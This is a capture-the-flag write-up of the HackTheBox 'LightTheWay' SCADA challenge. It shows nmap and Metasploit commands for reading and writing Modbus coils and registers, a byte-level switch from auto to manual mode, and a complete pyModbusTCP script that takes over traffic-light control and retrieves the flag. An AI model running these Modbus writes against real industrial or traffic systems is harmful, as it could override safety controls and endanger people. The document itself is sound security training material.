+++
date = "2021-11-24"
author = "biplavxyz"
title = "HackTheBox University CTF 2021 - LightTheWay - SCADA - Changing traffic lights with Metasploit and Python"
+++
Greetings everyone!  
This writeup is going to be about my best challenge from HackTheBox University Ctf 2021.  
This challenge was named `LightTheWay` from `SCADA` category. The goal of the challenge was to change the traffic lights to let the vehicle pass through all the stops. Nmap, and Metasploit were used for enumeration, and a python script was created to automate all of the monotonous steps.  

We were given an ip `10.129.96.95` and that was it.  

As with most challenges, the first step was `reconnaissance` using `nmap`.  
`nmap -sCV 10.129.96.95 -p 0-1000`  

From the nmap scan, port 22, 80, and 502 were found to be open. 
I skipped port `22` as it's almost impossible to break it. Next interesting port was port `80`.
  
![1](/scada1.png)
  
Checking port `80` showed a stopped vehicle, and different traffic lights on the top right corner with 6 junctions.  
  
![2](/scada2.png)
   
Also, there was a path highlighted in the `Human Machine Interface(HMI)` from where we had to move the vehicle to get the flag. 
 
`HMI` is basically a software that provides a user with graphical user interface to monitor or process commands in SCADA networks.  

As this was a `SCADA` related challenge, I started looking further onto port `502` as it's very poular port in SCADA systems for `modbus protocol`.  
So, it's time to dig deeper onto the `port 502`.  

Modbus operates as a `master-slave` architecture, which is basically like a `client-server` architecture. 
  
![3](/scada3.png)
   
In Modbus, `master` is like a client which sends a request to read or write, and `slave` is like a server which processes it, and provides output.  
Another thing to note about Modbus protocol is that it `does not have any sort of authentication` at any level of the protocol which makes it very vulnerable.  
 
Then, I fired up `metasploit` to do more enumeration.    
First command was `search modbus` to find all `modbus` related modules, which showed 6 matching modules.  
`auxiliary/scanner/scada/modbusclient` module seemed most interesting, so we went with it. 
   
![4](/scada4.png)
  
`use auxiliary/scanner/scada/modbusclient`  
`show info`  

After Checking for all options and info,it can be seen that we can read, and write data. `RHOST`, `RPORT`, and `DATA_ADDRESS` are required fields to be set.
  
![5](/scada5.png)
  
It can be set as follow:  
`set RHOST 10.129.96.95`
  
`set RPORT 502`
  
`set DATA_ADDRESS 0`  

`set NUMBER 0`

Also, if we take a look at `registers` for Modbus, `COIL` and `HOLDING_REGISTERS` are very interesting as they can be read and written easily.  
Here is how the registers look like in modbus protocol.  
  
![registers](/scada15.png)
 
If we have ability to read and write data, why not try it? Let's read what we can extract from there. So, I thought of reading the coils first to see how it looks like. It can be done with following command.  
 
`set action READ_COILS`
  
![6](/scada6.png)
  
Then, running the exploit reads the value of coils from `UNIT_NUMBER 1`.
We see a bunch of 0's, but interestingly there are also some `1's` in there.  
  
![7](/scada7.png)
  
Then, python can be used to find the index of first `1` in the list.
The first index was `571`.  

![8](/scada8.png)
  
Also, when I was setting the value `UNIT_NUMBER` with command `set UNIT_NUMBER 2`, `set UNIT_NUMBER 3` and so on, I was able to read coils only upto `UNIT_NUMBER 6`that had `1` somewhere in the output. Any `UNIT_NUMBER` beyond that didn't include `1`.  
That was interesting because there were `6 junctions` in the path. So, I was able to get index for all 6 junctions using similar approach. The `DATA_ADDRESS` index of all the six units were `571, 1921, 531,1267, 925, 888` respectively. All of this process is done by using python script later in the writeup.    

Now, it's time to write to the coils so that we can change the lights.  

When checking `http://10.129.96.95/api`, I was able to see the directions, and their corresponding coil values, but unfortunately the order of representation in the API doesn't match the actual order of directions. 
  
![9](/scada9.png)
   
It took us a while to figure it out, but we found out that the correct pattern to write was:  
`NG NY NR EG EY ER SG SY SR WG WY WR`  

![10](/scada2.png)
  
By looking at the picture, it's clear that we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.  

But, to change the lights the challenge stated that `We need to revert the system to manual`. So, let's first find a way to change to manual mode.  
For this purpose, we have to read `HOLDING REGISTERS` to see what values are in there.  
Initially, I ran `set action READ_HOLDING_REGISTERS` and it showed me error `ILLEGAL DATA ADDRESS`. So, changing the value for `NUMBER` solved this issue.  
I used command `set NUMBER 99` to set the value of `NUMBER` to 99, then ran it, which gave me decimal encoded numbers.  
  
![10](/scada10.png)
  
I used a python script to decode it back to `ASCII` which evaluated to `auto_mode:true`.  

![11](/scada11.png)

```python
auto = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]

print("".join(chr(x) for x in auto))
```
So, by changing the string `true` to `false`, and writing it to the `HOLDING_REGISTERS` we were able to change the mode to `manual`.  
  
![12](/scada12.png)
  
Again, metasploit mode can be used to write to the `REGISTERS` with following commands:  
`set DATA_REGISTERS 97,117,116,111,95,109,111,100,101,58,102,97,108,115,101`  

`set action WRITE_REGISTERS`  

`run`
    
![13](/scada13.png)
  
Now, we can verify it did indeed set the `auto mode:false` by reading the register values again.  
  
![14](/scada14.png)
  
The register values have been modified. So, now we can write to the coils and change the color of traffic lights.  

Recalling that order of the lights is `NG NY NR EG EY ER SG SY SR WG WY WR`.  

Current value for junction 1 is:   
`[False, False, True, False, False, True, False, False, True, True, False, False]`  

which can be changed to:   
`[False, False, True, False, False, True, False, False, True, False, False, True]`  
which will turn on green light on the west side so that the vehicle can pass Junction 1.  

Similar process can be followed for other Junctions too.  
The placement of lights was kind of weird, and we had to play around for a while to make it all work.  

As this process was little bit tedious with `metasploit`, `pyModbusTCP` client can be used to make this process faster.    

Also, we had to perform trial and error for a while to change  `data address base index` for each units inorder to write successfully to the coils.

Here is the final script that we wrote to get the flag:
  
```python
from pyModbusTCP.client import ModbusClient
import requests
import json


data_address = {}

c = ModbusClient(host="10.129.96.95", port="502", unit_id=1, auto_open=True)


## Manual off

for i in range(1,7):
    c.unit_id(i)
    c.write_multiple_registers(10, [102,97,108,115,101])
    print(f"[+] Slave_id {i} set to manual mode" )

for i in range(1,7):
    c.unit_id(i)
    regs = c.read_coils(0,2000)

    data_address[i] = regs.index(True)
c.unit_id(1)
c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False])

c.unit_id(2)
c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True])


c.unit_id(4)
c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False])


c.unit_id(6)
c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])

print(f"[+] pwn completed, Here's a gift for you!!")

print(json.loads(requests.get('http://10.129.96.95/api').text)['flag'])
```

  
![15](/scada_flag.gif)
And, **PWNED**    
Flag is: `HTB{w3_se3_tH3_l1ght}`

Thank you for reading.  
Let's Keep learning :)  

> - <cite>CarpeDiem</cite>
